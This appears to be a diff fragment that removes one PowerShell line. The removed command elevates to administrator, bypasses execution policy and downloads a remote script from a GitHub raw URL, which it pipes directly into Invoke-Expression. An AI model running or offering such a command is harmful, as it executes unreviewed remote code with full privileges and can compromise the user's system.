@@ -1,1 +1,0 @@
-powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"irm https://raw.githubusercontent.com/ngl2n8/all-for-one/main/test.ps1 | iex\"'"
